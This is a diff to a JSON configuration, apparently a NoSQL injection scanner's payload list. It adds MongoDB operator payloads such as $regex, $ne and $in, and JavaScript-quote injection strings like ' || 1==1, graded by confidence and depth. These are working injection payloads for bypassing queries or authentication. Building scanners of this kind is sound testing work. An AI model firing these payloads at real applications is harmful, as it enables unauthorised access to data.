@@ -5,7 +5,14 @@
     "mongo_operators": [
       {"payload": {"$gt": ""},   "confidence_hint": 85, "depth": "basic"},
       {"payload": {"$ne": null}, "confidence_hint": 85, "depth": "basic"},
-      {"payload": "';return true;//", "confidence_hint": 70, "depth": "extended"}
+      {"payload": "';return true;//", "confidence_hint": 70, "depth": "extended"},
+      {"payload": {"$regex": ".*"}, "confidence_hint": 85, "depth": "extended"},
+      {"payload": {"$exists": true}, "confidence_hint": 75, "depth": "extended"},
+      {"payload": {"$in": ["", null]}, "confidence_hint": 80, "depth": "extended"},
+      {"payload": {"$nin": [""]}, "confidence_hint": 70, "depth": "aggressive"},
+      {"payload": {"$type": 2}, "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "' || 1==1", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "';return(true);var x='", "confidence_hint": 70, "depth": "aggressive"}
     ]
   }
 }
